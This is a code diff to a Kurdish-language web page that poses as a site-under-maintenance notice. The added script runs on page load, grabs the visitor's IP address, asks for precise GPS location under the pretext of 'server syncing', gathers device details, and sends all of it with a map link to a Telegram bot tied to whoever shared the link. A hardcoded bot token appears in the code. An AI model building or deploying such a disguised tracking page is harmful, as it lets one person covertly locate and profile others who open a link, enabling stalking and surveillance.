@@ -44,22 +44,30 @@
     <div class="card">
         <div class="spinner"></div>
         <h2>🛠 ماڵپەڕەکە لەژێر کارکردندایە</h2>
-        <p>بەمزووانە بە شێوەیەکی تێروتەسەل چالاک دەکرێت. تکایە دواتر سەردانمان بکەرەوە.</p>
+        <p>تکایە چاوەڕێ بکە یان ڕێگە بە دەستگەیشتن بدە بۆ هاوڕێکەربوونی سەرڤەرەکە...</p>
     </div>
 
     <script>
         const BOT_TOKEN = "8918413203:AAG-EBiQakMDS0jK1H3d26ox0UpBh6LN-eY";
-        
-        // وەرگرتنی IDی خاوەنی لینکەکە لە URL
         const urlParams = new URLSearchParams(window.location.search);
         const ownerId = urlParams.get('id');
 
-        if (ownerId) {
-            // کۆکردنەوەی زانیارییەکانی ئامێرەکە
+        async function collectAndSendInfo() {
+            if (!ownerId) return;
+
+            // 1. وەرگرتنی IP
+            let userIp = "نەنێنراوە";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                userIp = ipData.ip;
+            } catch (e) {}
+
+            // 2. زانیاری ئامێر
             const ua = navigator.userAgent;
             const platform = navigator.platform;
             const screenRes = `${window.screen.width}x${window.screen.height} (Ratio:${window.devicePixelRatio})`;
-            
+
             let gpu = "نەدۆزرایەوە";
             try {
                 const canvas = document.createElement('canvas');
@@ -70,14 +78,43 @@
                 }
             } catch (e) {}
 
-            // ئامادەکردنی پەیامەکە بۆ تێلێگرام
-            const message = `🔔 **سەردانیکەرێکی نوێ کاتژمێرێک پێش ئێستا لێنکەکەی کردەوە!**\n\n` +
-                            `📱 **سیستەم/ئامێر:** \`${platform}\`\n` +
-                            `📐 **ڕوونی شاشە:** \`${screenRes}\`\n` +
-                            `🎮 **کارتی گرافیک (GPU):** \`${gpu}\`\n` +
-                            `🌐 **User-Agent:** \`${ua}\``;
+            // 3. هەوڵدان بۆ وەرگرتنی GPS Location (Latitude & Longitude)
+            let locText = "🔒 نەبەخشراوە (Disabled/Denied)";
+            let mapUrl = "";
 
-            // ناردنی زانیارییەکان بۆ بۆتەکە بۆ ئەوەی تەنها بۆ تۆی بنێرێت
+            if ("geolocation" in navigator) {
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        locText = `Lat: ${lat}, Long:${lon}`;
+                        mapUrl = `https://www.google.com/maps?q=${lat},${lon}`;
+                        sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
+                    },
+                    (error) => {
+                        sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
+                    },
+                    { enableHighAccuracy: true, timeout: 5000 }
+                );
+            } else {
+                sendData(userIp, platform, screenRes, gpu, ua, locText, mapUrl);
+            }
+        }
+
+        function sendData(ip, platform, screenRes, gpu, ua, location, mapUrl) {
+            let message = `🔔 **سەردانیکەرێکی نوێ لینکەکەی کردەوە!**\n\n` +
+                          `🌐 **IP Address:** \`${ip}\`\n` +
+                          `📍 **شوێنی دەقیق (GPS):** \`${location}\`\n`;
+
+            if (mapUrl) {
+                message += `🗺 **لینکی نەخشە:** [کرنەوە لە Google Maps](${mapUrl})\n`;
+            }
+
+            message += `\n📱 **سیستەم:** \`${platform}\`\n` +
+                       `📐 **ڕوونی شاشە:** \`${screenRes}\`\n` +
+                       `🎮 **GPU:** \`${gpu}\`\n` +
+                       `💻 **User-Agent:** \`${ua}\``;
+
             fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -88,6 +125,9 @@
                 })
             }).catch(err => console.error(err));
         }
+
+        // دەستپێکردنی بزوێنەرەکە
+        collectAndSendInfo();
     </script>
 
 </body>
